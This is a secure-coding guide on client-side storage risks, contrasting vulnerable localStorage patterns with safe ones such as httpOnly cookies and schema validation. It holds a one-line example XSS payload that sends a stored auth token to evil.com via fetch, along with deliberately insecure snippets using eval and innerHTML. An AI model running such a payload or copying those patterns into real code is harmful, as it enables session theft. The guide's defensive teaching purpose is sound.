# Client-Side Storage Security

Security risks of localStorage, sessionStorage, and IndexedDB.

## The Core Risk

Client-side storage is accessible to any JavaScript running on the same origin. If an XSS vulnerability exists, all data in localStorage, sessionStorage, and IndexedDB can be read and exfiltrated by the attacker.

## Vulnerable Patterns

### Auth Tokens in localStorage

```javascript
// VULNERABLE: any XSS can steal the token
localStorage.setItem("authToken", jwt);
localStorage.setItem("refreshToken", refreshToken);
localStorage.setItem("sessionId", session);

// Attacker's XSS payload:
// fetch("https://evil.com/steal?token=" + localStorage.getItem("authToken"))
```

### Sensitive Data in Client Storage

```javascript
// VULNERABLE: PII in localStorage
localStorage.setItem(
  "user",
  JSON.stringify({
    email: "user@example.com",
    ssn: "123-45-6789",
    creditCard: "4111111111111111",
  }),
);

// VULNERABLE: API keys in localStorage
localStorage.setItem("apiKey", "sk-live-abc123");
```

### Trusting Data from Storage

```javascript
// VULNERABLE: rendering stored data as HTML without sanitization
const savedContent = localStorage.getItem("draft");
element.innerHTML = savedContent;
// If another script wrote malicious HTML to "draft", this executes it

// VULNERABLE: evaluating stored data
const savedConfig = JSON.parse(localStorage.getItem("config"));
eval(savedConfig.initScript);
```

## Safe Patterns

### Use httpOnly Cookies for Auth

```javascript
// SAFE: server sets httpOnly cookie, client never handles the token
// Server-side:
res.cookie("session", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
});

// Client-side: no token handling needed
// Cookies are sent automatically with fetch({ credentials: "include" })
```

### Non-Sensitive Preferences Only

```javascript
// SAFE: only store non-sensitive UI preferences
localStorage.setItem("theme", "dark");
localStorage.setItem("language", "en");
localStorage.setItem("sidebarCollapsed", "true");
```

### Validate Data from Storage

```javascript
// SAFE: parse and validate before using
const raw = localStorage.getItem("settings");
if (raw) {
  try {
    const settings = JSON.parse(raw);
    if (typeof settings.fontSize === "number" && settings.fontSize > 0) {
      applyFontSize(settings.fontSize);
    }
  } catch {
    localStorage.removeItem("settings");
  }
}
```

### Schema Validation with Effect

```typescript
// SAFE: decode with a schema before trusting stored data
const StoredSettings = Schema.Struct({
  theme: Schema.Literal("light", "dark"),
  fontSize: Schema.Number.pipe(Schema.between(8, 72)),
});

const loadSettings = Effect.gen(function* () {
  const raw = localStorage.getItem("settings");
  if (!raw) return yield* new SettingsNotFoundError();
  return yield* Schema.decodeEffect(Schema.fromJsonString(StoredSettings))(raw);
});
```

## What Should and Should Not Be Stored

| Data Type                   | Storage Method          |
| --------------------------- | ----------------------- |
| Auth tokens, session IDs    | httpOnly cookies        |
| API keys, secrets           | Never on the client     |
| PII (email, SSN, etc.)      | Never in client storage |
| UI preferences (theme)      | localStorage is fine    |
| Form drafts (non-sensitive) | localStorage is fine    |
| Cached API responses        | Depends on sensitivity  |

## Verification Checklist

1. Are auth tokens (JWT, session IDs, refresh tokens) stored in localStorage or sessionStorage?
2. Is PII or sensitive data written to client-side storage?
3. Is data from localStorage rendered as HTML without sanitization?
4. Is data from localStorage parsed and used without validation?
5. Are API keys or secrets stored on the client side?
